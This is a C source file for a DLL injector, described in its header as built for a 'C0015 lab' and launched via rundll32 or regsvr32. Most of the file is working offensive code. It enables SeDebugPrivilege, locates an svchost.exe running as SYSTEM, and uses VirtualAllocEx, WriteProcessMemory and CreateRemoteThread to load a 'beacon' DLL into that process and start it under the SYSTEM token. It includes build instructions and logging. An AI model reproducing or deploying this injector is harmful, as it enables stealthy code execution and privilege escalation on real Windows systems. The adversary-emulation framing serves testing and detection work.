/*
 * injector.c - rundll32-launched DLL injector for the C0015 lab.
 *
 *   rundll32.exe <path>\injector.dll,Run
 *
 * It finds a svchost.exe running as SYSTEM, loads the beacon DLL into that process with a remote
 * LoadLibraryA, then starts the DLL's StartW export with a second remote thread. The beacon then runs
 * inside the service host, under the SYSTEM token.
 *
 * Paths:
 *   beacon   : C:\ProgramData\c0015\beacon.dll   (fallback C:\ProgramData\beacon.dll)
 *   log      : C:\ProgramData\c0015\inject.log
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -shared -o injector.dll injector.c -ladvapi32 -lpsapi
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sddl.h>

#pragma comment(lib, "psapi.lib")

#define DLL_PATH  "C:\\ProgramData\\c0015\\beacon.dll"
#define DLL_PATH2 "C:\\ProgramData\\beacon.dll"
#define LOG_PATH  "C:\\ProgramData\\c0015\\inject.log"

static void logline(const char *fmt, ...)
{
    FILE *f = fopen(LOG_PATH, "a");
    va_list ap;
    if (!f) return;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static BOOL enable_debug(void)
{
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return FALSE;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) { CloseHandle(tok); return FALSE; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(tok);
    return GetLastError() == ERROR_SUCCESS;
}

static BOOL is_system_token(HANDLE proc)
{
    HANDLE tok;
    TOKEN_USER *tu;
    DWORD len = 0;
    BOOL sys = FALSE;
    if (!OpenProcessToken(proc, TOKEN_QUERY, &tok)) return FALSE;
    GetTokenInformation(tok, TokenUser, NULL, 0, &len);
    tu = (TOKEN_USER *)malloc(len ? len : 1);
    if (tu && GetTokenInformation(tok, TokenUser, tu, len, &len)) {
        LPSTR str = NULL;
        if (ConvertSidToStringSidA(tu->User.Sid, &str)) {
            if (strcmp(str, "S-1-5-18") == 0) sys = TRUE;
            LocalFree(str);
        }
    }
    free(tu);
    CloseHandle(tok);
    return sys;
}

static DWORD find_system_svchost(void)
{
    HANDLE snap;
    PROCESSENTRY32 pe;
    DWORD found = 0;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            HANDLE h;
            if (_stricmp(pe.szExeFile, "svchost.exe") != 0) continue;
            h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!h) continue;
            if (is_system_token(h)) found = pe.th32ProcessID;
            CloseHandle(h);
            if (found) break;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static HMODULE remote_module(HANDLE proc, const char *name)
{
    HMODULE mods[1024];
    DWORD needed = 0, i;
    char path[MAX_PATH];

    if (!EnumProcessModulesEx(proc, mods, sizeof(mods), &needed, LIST_MODULES_ALL)) return NULL;
    for (i = 0; i < needed / sizeof(HMODULE); i++) {
        if (GetModuleFileNameExA(proc, mods[i], path, sizeof(path))) {
            if (strstr(path, name)) return mods[i];
        }
    }
    return NULL;
}

static BOOL inject_dll(DWORD pid, const char *dll)
{
    HANDLE proc, thread;
    LPVOID remote;
    SIZE_T len = strlen(dll) + 1, written = 0;
    DWORD tid = 0;
    FARPROC loadlib;
    HMODULE local, remote_base;
    FARPROC local_start;
    SIZE_T offset;

    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) { logline("open %lu failed %lu", pid, GetLastError()); return FALSE; }

    remote = VirtualAllocEx(proc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { logline("alloc failed %lu", GetLastError()); CloseHandle(proc); return FALSE; }

    if (!WriteProcessMemory(proc, remote, dll, len, &written) || written != len) {
        logline("write failed %lu", GetLastError());
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc);
        return FALSE;
    }

    loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    thread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, remote, 0, &tid);
    if (!thread) {
        logline("load thread failed %lu", GetLastError());
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
        CloseHandle(proc);
        return FALSE;
    }
    WaitForSingleObject(thread, 30000);
    CloseHandle(thread);
    logline("LoadLibraryA thread %lu finished", tid);

    remote_base = remote_module(proc, "beacon.dll");
    if (!remote_base) { logline("module not found in target"); CloseHandle(proc); return FALSE; }

    local = LoadLibraryExA(dll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!local) { logline("local map failed %lu", GetLastError()); CloseHandle(proc); return FALSE; }
    local_start = GetProcAddress(local, "StartW");
    if (!local_start) { logline("StartW not exported"); CloseHandle(proc); return FALSE; }
    offset = (SIZE_T)((BYTE *)local_start - (BYTE *)local);

    thread = CreateRemoteThread(proc, NULL, 0,
                                (LPTHREAD_START_ROUTINE)((BYTE *)remote_base + offset),
                                NULL, 0, &tid);
    if (!thread) {
        logline("start thread failed %lu", GetLastError());
        CloseHandle(proc);
        return FALSE;
    }
    WaitForSingleObject(thread, 20000);
    logline("StartW thread %lu started in svchost pid %lu", tid, pid);
    CloseHandle(thread);
    CloseHandle(proc);
    return TRUE;
}

__declspec(dllexport) HRESULT WINAPI Run(void)
{
    const char *dll = DLL_PATH;
    DWORD pid;

    logline("=== injector start as pid %lu ===", GetCurrentProcessId());
    enable_debug();

    if (GetFileAttributesA(DLL_PATH) == INVALID_FILE_ATTRIBUTES) {
        if (GetFileAttributesA(DLL_PATH2) != INVALID_FILE_ATTRIBUTES) dll = DLL_PATH2;
        else { logline("beacon dll not found"); return E_FAIL; }
    }

    pid = find_system_svchost();
    if (!pid) { logline("no SYSTEM svchost found"); return E_FAIL; }

    if (inject_dll(pid, dll)) logline("=== injector done ===");
    else logline("=== injector failed ===");
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)
{
    return Run();
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved)
{
    (void)h; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) logline("attached");
    return TRUE;
}
